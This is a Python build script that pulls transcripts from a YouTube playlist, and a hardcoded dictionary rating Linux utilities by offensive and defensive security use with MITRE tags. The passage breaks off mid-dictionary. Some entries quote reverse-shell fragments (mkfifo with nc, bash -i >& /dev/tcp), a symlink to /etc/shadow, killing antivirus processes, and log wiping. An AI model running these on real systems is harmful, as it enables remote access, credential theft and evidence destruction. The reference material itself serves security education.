#!/usr/bin/env python3
"""
Run once to generate ../frontend/public/knowledge.json
Usage: python build_knowledge.py
"""
import json
import os
import sys
from datetime import datetime
from pytubefix import Playlist, YouTube
from youtube_transcript_api import YouTubeTranscriptApi

PLAYLIST_ID = "PLp31D6HATKfeEHEFqFo5hlCOYwHi4Sl9O"
OUT_PATH = os.path.join(os.path.dirname(__file__), "..", "frontend", "public", "knowledge.json")
CACHE_PATH = os.path.join(os.path.dirname(__file__), "transcript_cache.json")

# ---------------------------------------------------------------------------
# SECURITY METADATA — hardcoded analysis per command
# hat: black | red | blue | gray
# threat_level: 1 (info) → 5 (critical offensive)
# ---------------------------------------------------------------------------
SECURITY_METADATA = {
    "xxd": {
        "hat": "black",
        "security_intent": "Hex dump tool used to inspect binary files, craft payloads, and analyze shellcode. Attackers use it to examine file headers, manually patch binaries, and encode malicious content.",
        "attack_vectors": ["payload inspection", "shellcode crafting", "binary patching", "magic byte manipulation"],
        "defense_use": "Forensic analysis of suspicious binaries and malware samples.",
        "mitre_tags": ["T1027", "T1140"],
        "threat_level": 4,
        "related_commands": ["od", "base64", "strings", "dd"],
    },
    "chroot": {
        "hat": "black",
        "security_intent": "Creates an isolated root directory. Attackers study chroot jailbreaks to escape sandboxed environments — a precursor to container escape techniques.",
        "attack_vectors": ["jail escape", "sandbox evasion", "privilege escalation path"],
        "defense_use": "Sandboxing untrusted processes, service isolation.",
        "mitre_tags": ["T1611", "T1564"],
        "threat_level": 4,
        "related_commands": ["su", "runcon", "chcon", "nsenter"],
    },
    "mkfifo": {
        "hat": "black",
        "security_intent": "Creates named pipes — a foundational building block for backdoors and reverse shells. The classic `mkfifo /tmp/f; nc ... < /tmp/f | /bin/sh > /tmp/f` pattern is a textbook reverse shell.",
        "attack_vectors": ["reverse shell", "backdoor creation", "IPC exploitation", "data exfiltration channel"],
        "defense_use": "None significant — primarily an offensive primitive in security contexts.",
        "mitre_tags": ["T1059.004", "T1090.001"],
        "threat_level": 5,
        "related_commands": ["nohup", "echo", "tee", "bash"],
    },
    "dd": {
        "hat": "black",
        "security_intent": "Raw disk read/write. Attackers clone disks for offline cracking, overwrite the MBR for persistence, wipe evidence, or exfiltrate raw disk images.",
        "attack_vectors": ["disk cloning", "MBR overwrite", "data exfiltration", "evidence wiping"],
        "defense_use": "Forensic disk imaging, secure drive wiping.",
        "mitre_tags": ["T1005", "T1561.002", "T1485"],
        "threat_level": 5,
        "related_commands": ["shred", "truncate", "split", "xxd"],
    },
    "shred": {
        "hat": "black",
        "security_intent": "Overwrites files multiple times to prevent forensic recovery. Attackers use it after a breach to destroy evidence before leaving.",
        "attack_vectors": ["evidence destruction", "anti-forensics", "secure deletion"],
        "defense_use": "Secure deletion of sensitive data before decommissioning hardware.",
        "mitre_tags": ["T1070.004", "T1485"],
        "threat_level": 4,
        "related_commands": ["truncate", "dd", "unlink", "rm"],
    },
    "base64": {
        "hat": "black",
        "security_intent": "Encoding used to obfuscate malicious payloads, bypass signature-based detection, and transfer binary data through text channels.",
        "attack_vectors": ["payload obfuscation", "AV/IDS evasion", "data encoding for exfiltration"],
        "defense_use": "Detecting base64-encoded payloads in logs is a key blue team skill.",
        "mitre_tags": ["T1027", "T1132.001"],
        "threat_level": 4,
        "related_commands": ["base32", "xxd", "od", "tr"],
    },
    "base32": {
        "hat": "black",
        "security_intent": "Alternative encoding for payload obfuscation. Less recognized than base64 by security tools, making it useful for AV evasion.",
        "attack_vectors": ["payload obfuscation", "AV evasion", "alternative encoding"],
        "defense_use": "Understanding encoding schemes for malware analysis.",
        "mitre_tags": ["T1027", "T1132.001"],
        "threat_level": 3,
        "related_commands": ["base64", "xxd", "tr", "od"],
    },
    "od": {
        "hat": "red",
        "security_intent": "Octal/binary dump for reverse engineering. Red teamers use it to inspect file contents at a low level when xxd is unavailable.",
        "attack_vectors": ["binary analysis", "shellcode inspection", "file format analysis"],
        "defense_use": "Malware analysis, examining suspicious binaries.",
        "mitre_tags": ["T1083", "T1027"],
        "threat_level": 2,
        "related_commands": ["xxd", "strings", "hexdump", "file"],
    },
    "runcon": {
        "hat": "black",
        "security_intent": "Runs commands with a specific SELinux security context — a direct MAC policy subversion tool. Used to test and bypass SELinux enforcement.",
        "attack_vectors": ["SELinux policy bypass", "security context escalation", "MAC evasion"],
        "defense_use": "Testing SELinux policy enforcement.",
        "mitre_tags": ["T1548", "T1562.001"],
        "threat_level": 5,
        "related_commands": ["chcon", "chroot", "su", "id"],
    },
    "chcon": {
        "hat": "black",
        "security_intent": "Changes SELinux security context of files. Attackers use it to relabel files to bypass mandatory access controls.",
        "attack_vectors": ["SELinux label manipulation", "MAC bypass", "file context spoofing"],
        "defense_use": "Restoring correct SELinux contexts after misconfiguration.",
        "mitre_tags": ["T1548", "T1222"],
        "threat_level": 4,
        "related_commands": ["runcon", "chmod", "chown", "ls"],
    },
    "su": {
        "hat": "black",
        "security_intent": "Classic privilege escalation target. After compromising a low-privilege account, attackers su to root. Weak passwords or sudo misconfigurations make this trivial.",
        "attack_vectors": ["privilege escalation", "lateral movement", "credential testing"],
        "defense_use": "Understanding legitimate su usage helps detect abuse in logs.",
        "mitre_tags": ["T1548.003", "T1078", "T1134"],
        "threat_level": 5,
        "related_commands": ["sudo", "whoami", "id", "passwd"],
    },
    "nohup": {
        "hat": "black",
        "security_intent": "Runs processes immune to hangup signals — key for persistence. Attackers use nohup to ensure backdoors and reverse shells survive session termination.",
        "attack_vectors": ["persistence mechanism", "backdoor survival after logout", "detaching malicious processes"],
        "defense_use": "Detecting nohup processes under unexpected users.",
        "mitre_tags": ["T1546", "T1543", "T1059.004"],
        "threat_level": 4,
        "related_commands": ["mkfifo", "screen", "bg", "disown"],
    },
    "mktemp": {
        "hat": "red",
        "security_intent": "Creates secure temporary files. Understanding mktemp exposes TOCTOU (Time-of-Check-Time-of-Use) race conditions in scripts that don't use it — a classic vulnerability class.",
        "attack_vectors": ["TOCTOU race conditions", "symlink attacks on predictable temp files"],
        "defense_use": "Secure temporary file creation to prevent race conditions.",
        "mitre_tags": ["T1036", "T1574"],
        "threat_level": 3,
        "related_commands": ["ln", "chmod", "find", "truncate"],
    },
    "stdbuf": {
        "hat": "black",
        "security_intent": "Manipulates I/O buffering. Used to evade detection tools that rely on line-buffered output, and to control timing of data through pipes.",
        "attack_vectors": ["IDS evasion via buffer manipulation", "output timing control"],
        "defense_use": "Understanding buffering for accurate log analysis.",
        "mitre_tags": ["T1562", "T1027"],
        "threat_level": 3,
        "related_commands": ["tee", "mkfifo", "nohup", "timeout"],
    },
    "csplit": {
        "hat": "black",
        "security_intent": "Splits files by content patterns. Used to chunk exfiltration payloads below size-based IDS thresholds, or fragment malware for delivery.",
        "attack_vectors": ["data exfiltration chunking", "payload splitting to bypass size limits"],
        "defense_use": "None significant in security context.",
        "mitre_tags": ["T1030", "T1560"],
        "threat_level": 3,
        "related_commands": ["split", "dd", "base64", "tar"],
    },
    "split": {
        "hat": "black",
        "security_intent": "Splits files into chunks. Bypasses upload size restrictions, splits exfiltration payloads, or delivers malware in parts to evade signature detection.",
        "attack_vectors": ["payload delivery splitting", "data exfiltration bypass", "file size evasion"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1030", "T1560"],
        "threat_level": 3,
        "related_commands": ["csplit", "dd", "base64", "cat"],
    },
    "truncate": {
        "hat": "black",
        "security_intent": "Silently clears log files without deleting them — the file remains but all evidence is gone. A stealth log-wiping technique that avoids triggering deletion alerts.",
        "attack_vectors": ["log clearing", "evidence destruction", "anti-forensics", "log tampering"],
        "defense_use": "Monitoring for unexpected file size reductions.",
        "mitre_tags": ["T1070.002", "T1485"],
        "threat_level": 4,
        "related_commands": ["shred", "dd", "echo", "tee"],
    },
    "grep": {
        "hat": "red",
        "security_intent": "The red team swiss army knife post-exploitation. Hunts for credentials in config files, finds SUID binaries, searches logs for IOCs, extracts sensitive data.",
        "attack_vectors": ["credential harvesting", "sensitive data discovery", "SUID binary discovery", "IOC hunting"],
        "defense_use": "Log analysis and threat hunting for blue teams.",
        "mitre_tags": ["T1083", "T1552", "T1081"],
        "threat_level": 3,
        "related_commands": ["find", "cat", "cut", "sort"],
    },
    "find": {
        "hat": "red",
        "security_intent": "Essential post-exploitation tool. `find / -perm -4000` discovers SUID binaries for privilege escalation. `find / -writable` locates payload placement spots. A pentest staple.",
        "attack_vectors": ["SUID/SGID binary discovery", "world-writable directory enumeration", "recently modified file detection"],
        "defense_use": "Finding misconfigured permissions during hardening audits.",
        "mitre_tags": ["T1083", "T1548.001", "T1222"],
        "threat_level": 4,
        "related_commands": ["grep", "ls", "chmod", "stat"],
    },
    "tee": {
        "hat": "red",
        "security_intent": "Splits output to stdout and file simultaneously. Creates transparent interception — attackers log data passing through a pipe without the victim process knowing.",
        "attack_vectors": ["transparent data interception", "covert logging channel"],
        "defense_use": "Capturing command output for audit trails.",
        "mitre_tags": ["T1020", "T1056"],
        "threat_level": 3,
        "related_commands": ["mkfifo", "stdbuf", "nohup", "cat"],
    },
    "comm": {
        "hat": "blue",
        "security_intent": "Compares two sorted files. Blue teams compare known-good file lists against current state to detect unauthorized changes — simple file integrity monitoring.",
        "attack_vectors": [],
        "defense_use": "File integrity comparison, detecting added/removed files between system snapshots.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
        "related_commands": ["diff", "sort", "uniq", "md5sum"],
    },
    "stty": {
        "hat": "red",
        "security_intent": "Controls terminal I/O settings. `stty raw` can capture keystrokes before processing — relevant to understanding terminal-based keylogging and TTY hijacking.",
        "attack_vectors": ["raw keystroke capture", "terminal manipulation", "TTY hijacking"],
        "defense_use": "Understanding terminal security for secure system design.",
        "mitre_tags": ["T1056.001"],
        "threat_level": 3,
        "related_commands": ["tty", "script", "screen", "who"],
    },
    "chmod": {
        "hat": "blue",
        "security_intent": "Controls file permissions — the first line of Linux defense. Misconfigured permissions (world-writable, SUID on wrong files) are among the most exploited vectors.",
        "attack_vectors": ["SUID bit setting for persistence", "world-writable files for payload injection"],
        "defense_use": "Permission hardening, removing unnecessary SUID/SGID bits.",
        "mitre_tags": ["T1222.002", "T1548.001"],
        "threat_level": 2,
        "related_commands": ["chown", "chgrp", "find", "stat"],
    },
    "chgrp": {
        "hat": "blue",
        "security_intent": "Changes file group ownership — part of the DAC triad. Proper group assignment limits lateral movement between users sharing a system.",
        "attack_vectors": [],
        "defense_use": "Group-based access control, limiting file access to specific service accounts.",
        "mitre_tags": ["T1222.002"],
        "threat_level": 1,
        "related_commands": ["chmod", "chown", "id", "groups"],
    },
    "sha256sum": {
        "hat": "blue",
        "security_intent": "Computes SHA-256 hashes for integrity verification. Comparing hashes of system binaries against known-good baselines reveals compromised or backdoored files.",
        "attack_vectors": [],
        "defense_use": "File integrity monitoring, malware detection via hash comparison.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha512sum", "md5sum", "b2sum", "comm"],
    },
    "sha1sum": {
        "hat": "blue",
        "security_intent": "SHA-1 verification. Cryptographically weak for signatures, but teaches why algorithm choice matters — SHA-1 collisions are a real attack.",
        "attack_vectors": [],
        "defense_use": "Legacy integrity verification, understanding hash collision risks.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha256sum", "md5sum", "sha512sum", "cksum"],
    },
    "md5sum": {
        "hat": "blue",
        "security_intent": "MD5 hashing — weak for cryptography but widely used for integrity checks. Understanding its collision weaknesses is fundamental security knowledge.",
        "attack_vectors": ["hash collision exploitation"],
        "defense_use": "Basic integrity verification, understanding where MD5 is insufficient.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha256sum", "sha1sum", "b2sum", "cksum"],
    },
    "sha512sum": {
        "hat": "blue",
        "security_intent": "SHA-512 provides strong integrity guarantees. Used for verifying critical system files and OS images against sophisticated tampering.",
        "attack_vectors": [],
        "defense_use": "Strong integrity verification for critical files and OS images.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha256sum", "sha384sum", "sha224sum", "b2sum"],
    },
    "sha384sum": {
        "hat": "blue",
        "security_intent": "SHA-384 — used in high-security and compliance environments where regulations specify this variant.",
        "attack_vectors": [],
        "defense_use": "Compliance-driven integrity verification.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha256sum", "sha512sum", "sha224sum", "sha1sum"],
    },
    "sha224sum": {
        "hat": "blue",
        "security_intent": "SHA-224 — the compact SHA-2 variant. Relevant in embedded/IoT security where output size is constrained.",
        "attack_vectors": [],
        "defense_use": "Integrity verification in resource-constrained environments.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha256sum", "sha512sum", "md5sum", "b2sum"],
    },
    "b2sum": {
        "hat": "blue",
        "security_intent": "BLAKE2 hashing — faster than SHA-2 and more modern. Increasingly replacing MD5/SHA-1 for integrity checks in security tooling.",
        "attack_vectors": [],
        "defense_use": "Modern file integrity verification, faster than SHA-2 for large file scanning.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["sha256sum", "sha512sum", "md5sum", "cksum"],
    },
    "cksum": {
        "hat": "blue",
        "security_intent": "Legacy CRC checksum — not cryptographically secure. Its teaching value: CRC is easily manipulated by attackers, illustrating why CRC ≠ integrity guarantee.",
        "attack_vectors": ["CRC manipulation to bypass weak integrity checks"],
        "defense_use": "Basic error detection only — not security-grade.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["md5sum", "sha256sum", "b2sum", "sum"],
    },
    "sum": {
        "hat": "blue",
        "security_intent": "Oldest Unix checksum — historically significant. Shows how checksum algorithms evolved toward cryptographic hashes, and why the old ones fail security requirements.",
        "attack_vectors": [],
        "defense_use": "Historical context for integrity verification evolution.",
        "mitre_tags": ["T1553"],
        "threat_level": 1,
        "related_commands": ["cksum", "md5sum", "sha256sum", "b2sum"],
    },
    "who": {
        "hat": "blue",
        "security_intent": "Lists logged-in users. Blue teams detect unauthorized sessions. Unexpected users or sessions from unusual IPs are active IOCs.",
        "attack_vectors": [],
        "defense_use": "Session monitoring, detecting unauthorized access, incident response triage.",
        "mitre_tags": ["T1033", "T1078"],
        "threat_level": 1,
        "related_commands": ["whoami", "w", "last", "pinky"],
    },
    "whoami": {
        "hat": "red",
        "security_intent": "First command run after gaining shell access — confirms the compromised user and privilege level. A classic post-exploitation reflex.",
        "attack_vectors": ["post-exploitation enumeration", "privilege verification after escalation"],
        "defense_use": "Detecting whoami in logs signals active post-exploitation enumeration.",
        "mitre_tags": ["T1033"],
        "threat_level": 2,
        "related_commands": ["id", "su", "groups", "who"],
    },
    "pinky": {
        "hat": "blue",
        "security_intent": "Lightweight user information lookup. Blue teams enumerate sessions and correlate with authentication logs.",
        "attack_vectors": ["user enumeration"],
        "defense_use": "User session monitoring and audit.",
        "mitre_tags": ["T1033", "T1087"],
        "threat_level": 1,
        "related_commands": ["who", "whoami", "w", "logname"],
    },
    "logname": {
        "hat": "red",
        "security_intent": "Returns the original login name even after su/sudo changed identity. Reveals the real authenticated user — useful for tracing privilege escalation.",
        "attack_vectors": ["original user identification post-elevation"],
        "defense_use": "Correlating login identity with effective identity in audit logs.",
        "mitre_tags": ["T1033"],
        "threat_level": 2,
        "related_commands": ["whoami", "id", "who", "su"],
    },
    "top": {
        "hat": "blue",
        "security_intent": "Real-time process monitor. Blue teams watch for anomalous CPU spikes (cryptomining), unexpected processes, and suspicious process trees indicating compromise.",
        "attack_vectors": [],
        "defense_use": "Detecting cryptominers, ransomware activity, anomalous process behavior.",
        "mitre_tags": ["T1057", "T1496"],
        "threat_level": 1,
        "related_commands": ["ps", "kill", "nice", "uptime"],
    },
    "uptime": {
        "hat": "blue",
        "security_intent": "Shows uptime and load averages. Unexpected reboots (low uptime) indicate attack activity. High load can signal cryptomining or DoS.",
        "attack_vectors": [],
        "defense_use": "Detecting unauthorized reboots, monitoring for DoS/cryptomining via load average.",
        "mitre_tags": ["T1496", "T1529"],
        "threat_level": 1,
        "related_commands": ["top", "who", "last", "hostname"],
    },
    "hostname": {
        "hat": "red",
        "security_intent": "Identifies the target system. One of the first recon commands after initial access — maps the compromised host within the network topology.",
        "attack_vectors": ["system fingerprinting", "network topology mapping"],
        "defense_use": "Verifying system identity, detecting hostname spoofing.",
        "mitre_tags": ["T1082", "T1016"],
        "threat_level": 2,
        "related_commands": ["uname", "arch", "hostid", "ip"],
    },
    "install": {
        "hat": "blue",
        "security_intent": "Copies files with specific permissions atomically. Prevents race conditions in deployment scripts that could be exploited via TOCTOU attacks.",
        "attack_vectors": [],
        "defense_use": "Secure file deployment with correct permissions, preventing TOCTOU in installers.",
        "mitre_tags": ["T1222"],
        "threat_level": 1,
        "related_commands": ["chmod", "chown", "cp", "mktemp"],
    },
    "pathchk": {
        "hat": "blue",
        "security_intent": "Validates portability of file paths. Used to detect path traversal risks and ensure paths stay within expected bounds.",
        "attack_vectors": [],
        "defense_use": "Path validation to prevent directory traversal vulnerabilities.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
        "related_commands": ["realpath", "readlink", "dirname", "basename"],
    },
    "realpath": {
        "hat": "blue",
        "security_intent": "Resolves the canonical absolute path following all symlinks. Prevents symlink attacks by verifying the real destination before file operations.",
        "attack_vectors": [],
        "defense_use": "Symlink attack prevention, path canonicalization in security-sensitive scripts.",
        "mitre_tags": ["T1036", "T1574"],
        "threat_level": 1,
        "related_commands": ["readlink", "pathchk", "ln", "mktemp"],
    },
    "readlink": {
        "hat": "blue",
        "security_intent": "Reads symlink targets. Used defensively to detect where a symlink actually points before following it — catches symlink attacks.",
        "attack_vectors": [],
        "defense_use": "Detecting symlink attacks, verifying link targets in security audits.",
        "mitre_tags": ["T1036", "T1574"],
        "threat_level": 1,
        "related_commands": ["realpath", "ln", "pathchk", "stat"],
    },
    "kill": {
        "hat": "red",
        "security_intent": "Sends signals to processes. Attackers terminate security tools, AV processes, and monitoring daemons. `kill -9 [av-pid]` is a common defense evasion step.",
        "attack_vectors": ["disabling security tools", "terminating monitoring agents", "killing AV processes"],
        "defense_use": "Terminating suspicious processes during incident response.",
        "mitre_tags": ["T1562.001", "T1489"],
        "threat_level": 3,
        "related_commands": ["ps", "top", "nohup", "systemctl"],
    },
    "nice": {
        "hat": "black",
        "security_intent": "Sets process CPU priority. Attackers run cryptominers or long exploits at nice 19 to evade CPU-anomaly-based detection systems.",
        "attack_vectors": ["cryptominer evasion", "low-profile persistence", "evading CPU-based detection"],
        "defense_use": "Detecting suspiciously nice'd processes running under unexpected accounts.",
        "mitre_tags": ["T1564", "T1496"],
        "threat_level": 3,
        "related_commands": ["top", "ps", "nohup", "timeout"],
    },
    "timeout": {
        "hat": "red",
        "security_intent": "Runs commands with a time limit. Used in automated attack scripts to prevent hung connections from blocking the chain, and for timing-based attack orchestration.",
        "attack_vectors": ["automated attack scripting", "connection timeout management"],
        "defense_use": "Limiting execution time of potentially dangerous commands.",
        "mitre_tags": ["T1059.004"],
        "threat_level": 2,
        "related_commands": ["sleep", "nohup", "stdbuf", "nice"],
    },
    "link": {
        "hat": "black",
        "security_intent": "Creates hard links at the syscall level. Hard link attacks bypass certain permission checks and create persistent file references even after the original is deleted.",
        "attack_vectors": ["hard link attacks", "bypassing deletion-based cleanup", "persistence via hard links"],
        "defense_use": "Understanding hard link behavior for forensics.",
        "mitre_tags": ["T1036", "T1547"],
        "threat_level": 3,
        "related_commands": ["ln", "unlink", "realpath", "find"],
    },
    "unlink": {
        "hat": "black",
        "security_intent": "Removes a directory entry directly. Bypasses protections that block normal rm, and can manipulate file reference counts to delete files that shouldn't be deletable.",
        "attack_vectors": ["bypassing deletion protections", "file reference manipulation"],
        "defense_use": "Understanding filesystem internals for forensics.",
        "mitre_tags": ["T1070.004", "T1036"],
        "threat_level": 3,
        "related_commands": ["link", "ln", "shred", "rm"],
    },
    "ln": {
        "hat": "black",
        "security_intent": "Creates symbolic and hard links. Symlink attacks (`ln -s /etc/shadow /tmp/exploit`) redirect file operations to sensitive targets. A prerequisite for TOCTOU exploitation.",
        "attack_vectors": ["symlink attacks", "TOCTOU exploitation", "redirecting file writes to sensitive targets"],
        "defense_use": "Understanding symlink risks for secure coding and auditing.",
        "mitre_tags": ["T1036", "T1574.009"],
        "threat_level": 4,
        "related_commands": ["mktemp", "realpath", "readlink", "find"],
    },
    "shuf": {
        "hat": "red",
        "security_intent": "Generates random permutations. Used to randomize attack patterns to evade sequential detection, and shuffle wordlists for more effective brute-force campaigns.",
        "attack_vectors": ["wordlist randomization for brute force", "randomizing attack order to evade detection"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1110"],
        "threat_level": 2,
        "related_commands": ["sort", "seq", "tr", "grep"],
    },
    "tr": {
        "hat": "red",
        "security_intent": "Character-level translation. ROT13 is `tr 'A-Za-z' 'N-ZA-Mn-za-m'`. Used to strip null bytes from shellcode, obfuscate scripts, and transform data for encoding pipelines.",
        "attack_vectors": ["simple payload obfuscation", "ROT13 encoding", "null byte stripping from shellcode"],
        "defense_use": "Data normalization for log analysis.",
        "mitre_tags": ["T1027", "T1132"],
        "threat_level": 2,
        "related_commands": ["base64", "xxd", "od", "sed"],
    },
    "echo": {
        "hat": "black",
        "security_intent": "Writes arbitrary content to files and stdout. Used to drop malicious cron jobs, inject SSH authorized keys, write reverse shell scripts. `echo 'bash -i >& /dev/tcp/...'` is a classic one-liner.",
        "attack_vectors": ["writing malicious files", "cron job injection", "SSH key injection", "payload delivery"],
        "defense_use": "Understanding how payloads are written helps detect file write anomalies.",
        "mitre_tags": ["T1059.004", "T1098.004", "T1053.003"],
        "threat_level": 4,
        "related_commands": ["tee", "cat", "nohup", "chmod"],
    },
    "sort": {
        "hat": "red",
        "security_intent": "Sorts text data. Post-exploitation: deduplicates harvested credentials, organizes discovered hostnames, processes large data dumps for analysis.",
        "attack_vectors": ["credential deduplication", "data organization for analysis"],
        "defense_use": "Log analysis and SIEM data processing.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
        "related_commands": ["uniq", "grep", "cut", "comm"],
    },
    "uniq": {
        "hat": "red",
        "security_intent": "Removes duplicate lines. With sort, deduplicates credential dumps, unique-ifies discovered hosts, and cleans brute-force output.",
        "attack_vectors": ["credential dump processing"],
        "defense_use": "Log deduplication for SIEM analysis.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
        "related_commands": ["sort", "grep", "cut", "comm"],
    },
    "cut": {
        "hat": "red",
        "security_intent": "Extracts specific fields from delimited text. Used to extract usernames from /etc/passwd, parse credentials from configs, slice tokens from log output.",
        "attack_vectors": ["credential extraction from /etc/passwd", "config file parsing", "token extraction from logs"],
        "defense_use": "Log parsing for threat hunting.",
        "mitre_tags": ["T1552", "T1087"],
        "threat_level": 2,
        "related_commands": ["grep", "awk", "sort", "cat"],
    },
    "cat": {
        "hat": "red",
        "security_intent": "Reads file contents. Post-exploitation: dumps /etc/passwd, /etc/shadow, SSH keys, and config files. Often the first tool used after gaining shell access.",
        "attack_vectors": ["sensitive file reading", "credential dumping", "SSH key theft", "config exfiltration"],
        "defense_use": "Reading log files for analysis.",
        "mitre_tags": ["T1552", "T1083", "T1005"],
        "threat_level": 3,
        "related_commands": ["grep", "cut", "head", "tail"],
    },
    "head": {
        "hat": "red",
        "security_intent": "Reads the beginning of files. Used to quickly sample log and config files during recon without reading full files — reduces noise in detection logs.",
        "attack_vectors": ["stealthy file sampling", "config file inspection"],
        "defense_use": "Quick log inspection.",
        "mitre_tags": ["T1083", "T1552"],
        "threat_level": 1,
        "related_commands": ["tail", "cat", "grep", "cut"],
    },
    "tail": {
        "hat": "blue",
        "security_intent": "`tail -f` provides real-time file monitoring. Blue teams use `tail -f /var/log/auth.log` as a simple intrusion detection feed.",
        "attack_vectors": [],
        "defense_use": "Real-time log monitoring for intrusion detection.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
        "related_commands": ["head", "grep", "cat", "journalctl"],
    },
    "wc": {
        "hat": "gray",
        "security_intent": "Counts lines, words, bytes. Used to count failed login attempts in logs, measure file sizes for anomaly detection.",
        "attack_vectors": [],
        "defense_use": "Counting events in logs, detecting unusually large files.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": ["grep", "sort", "cat", "cut"],
    },
    "tac": {
        "hat": "gray",
        "security_intent": "Reverse-reads files from end to beginning. Used to read logs in reverse for finding the most recent events quickly during incident response.",
        "attack_vectors": [],
        "defense_use": "Reverse log reading during incident response.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": ["cat", "tail", "head", "grep"],
    },
    "sync": {
        "hat": "blue",
        "security_intent": "Flushes filesystem buffers to disk. Critical in forensics — ensures evidence is written before imaging, and protects log integrity.",
        "attack_vectors": [],
        "defense_use": "Pre-imaging flush in digital forensics, log integrity assurance.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": ["dd", "shred", "truncate", "mount"],
    },
    "reboot": {
        "hat": "black",
        "security_intent": "Forces system restart. Used as DoS or to force re-execution of injected startup scripts after adding persistence (e.g., malicious /etc/rc.local entry).",
        "attack_vectors": ["denial of service", "forcing re-execution of injected startup scripts"],
        "defense_use": "Controlled reboot for applying security patches.",
        "mitre_tags": ["T1529", "T1059.004"],
        "threat_level": 3,
        "related_commands": ["shutdown", "sync", "nohup", "systemctl"],
    },
    "shutdown": {
        "hat": "black",
        "security_intent": "Controlled system shutdown. In attacker hands: DoS tool, or anti-forensics (shutting down before investigators can image memory).",
        "attack_vectors": ["denial of service", "anti-forensics via memory destruction on shutdown"],
        "defense_use": "Controlled shutdown for maintenance.",
        "mitre_tags": ["T1529"],
        "threat_level": 3,
        "related_commands": ["reboot", "sync", "kill", "systemctl"],
    },
    "sleep": {
        "hat": "red",
        "security_intent": "Introduces delays. Used to evade sandbox detection (sandboxes time out fast), time multi-stage attacks, and wait for conditions before executing payloads.",
        "attack_vectors": ["sandbox evasion via long delays", "timed payload execution", "attack synchronization"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1497.003"],
        "threat_level": 2,
        "related_commands": ["timeout", "nice", "nohup", "at"],
    },
    "factor": {
        "hat": "gray",
        "security_intent": "Factors integers into primes. Subtle crypto relevance: factoring large numbers underpins RSA security. Understanding factorization explains why RSA works and where quantum breaks it.",
        "attack_vectors": [],
        "defense_use": "Educational context for public-key cryptography fundamentals.",
        "mitre_tags": [],
        "threat_level": 1,
        "related_commands": ["openssl", "seq", "expr", "bc"],
    },
    "hostid": {
        "hat": "red",
        "security_intent": "Returns a unique numeric host identifier. Used to fingerprint and track individual machines in a network during recon.",
        "attack_vectors": ["host fingerprinting", "unique machine identification for targeting"],
        "defense_use": "Asset identification.",
        "mitre_tags": ["T1082"],
        "threat_level": 1,
        "related_commands": ["hostname", "uname", "arch", "id"],
    },
    "arch": {
        "hat": "red",
        "security_intent": "Returns CPU architecture. Critical for selecting the correct payload architecture — wrong arch = crash instead of shell. First step after gaining access.",
        "attack_vectors": ["payload architecture selection", "target system fingerprinting"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1082"],
        "threat_level": 2,
        "related_commands": ["uname", "hostname", "hostid", "file"],
    },
    "nproc": {
        "hat": "red",
        "security_intent": "Returns CPU count. Attackers use it to optimize multi-threaded brute-force and crypto operations for maximum performance on compromised hardware.",
        "attack_vectors": ["optimizing parallel brute-force attacks", "threading for cryptomining"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1082", "T1496"],
        "threat_level": 2,
        "related_commands": ["arch", "hostname", "top", "uptime"],
    },
    "seq": {
        "hat": "red",
        "security_intent": "Generates numeric sequences. Used to create port lists for scanning, enumerate IP ranges, and build wordlists for brute-force attacks.",
        "attack_vectors": ["port scan sequence generation", "IP range enumeration", "wordlist building"],
        "defense_use": "None significant.",
        "mitre_tags": ["T1046", "T1110"],
        "threat_level": 2,
        "related_commands": ["shuf", "sort", "tr", "xargs"],
    },
    "yes": {
        "hat": "black",
        "security_intent": "Infinite output of 'y'. Automatically accepts dangerous prompts, overwhelms pipe-based processes, and contributes to resource exhaustion attacks.",
        "attack_vectors": ["automated acceptance of destructive prompts", "pipe-based resource exhaustion"],
        "defense_use": "None — audit scripts that pipe from yes.",
        "mitre_tags": ["T1059.004"],
        "threat_level": 2,
        "related_commands": ["echo", "dd", "timeout", "nohup"],
    },
    "printenv": {
        "hat": "red",
        "security_intent": "Dumps all environment variables. A goldmine post-exploitation — env vars routinely contain API keys, passwords, database URLs, and auth tokens.",
        "attack_vectors": ["credential harvesting", "API key theft", "token extraction", "database credential discovery"],
        "defense_use": "Auditing env vars for accidental credential exposure in CI/CD.",
        "mitre_tags": ["T1552.007", "T1083"],
        "threat_level": 4,
        "related_commands": ["env", "export", "cat", "grep"],
    },
    "du": {
        "hat": "red",
        "security_intent": "Reports disk usage per directory. Attackers identify large directories containing valuable data worth exfiltrating.",
        "attack_vectors": ["valuable data discovery for exfiltration targeting"],
        "defense_use": "Detecting unusual disk usage that may indicate data staging.",
        "mitre_tags": ["T1083", "T1005"],
        "threat_level": 2,
        "related_commands": ["find", "df", "ls", "stat"],
    },
    "stat": {
        "hat": "red",
        "security_intent": "Shows detailed file metadata including all timestamps. Post-exploitation: find recently modified configs, verify file authenticity, build a timeline of system activity.",
        "attack_vectors": ["metadata analysis for recon", "finding recently modified config files"],
        "defense_use": "Forensic timeline analysis, detecting tampering via timestamp anomalies.",
        "mitre_tags": ["T1083", "T1070.006"],
        "threat_level": 2,
        "related_commands": ["find", "ls", "file", "touch"],
    },
    "df": {
        "hat": "blue",
        "security_intent": "Shows filesystem disk space. Detects disk-filling DoS attacks and identifies mounted filesystems including suspicious or hidden mounts.",
        "attack_vectors": [],
        "defense_use": "Detecting disk-filling attacks, identifying suspicious filesystem mounts.",
        "mitre_tags": ["T1083"],
        "threat_level": 1,
